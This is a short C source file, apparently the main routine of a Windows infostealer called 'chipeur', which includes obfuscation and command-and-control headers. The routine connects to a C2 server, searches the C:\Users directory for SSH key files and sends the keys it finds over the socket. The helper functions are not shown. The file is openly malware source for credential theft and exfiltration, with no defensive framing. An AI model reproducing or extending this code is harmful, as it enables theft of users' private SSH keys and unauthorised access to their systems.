#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#include "find_ssh_key.h"
#include "obfuscation.h"
#include "c2.h"

int main(void) {
  SetConsoleOutputCP(CP_UTF8);

  sshKey keysFilenamesTab[MAX_KEY_FILES] = {0,0};
  DWORD32 lenKeysTab = 0;

  SOCKET sock;
  BOOL success = connect_to_c2(&sock);
  if (success == 0){
    exit(-1);
  }

  find_ssh_key(L"C:\\Users", keysFilenamesTab, &lenKeysTab);
  success = send_ssh_key(keysFilenamesTab, lenKeysTab, &sock);

  return EXIT_SUCCESS;
}
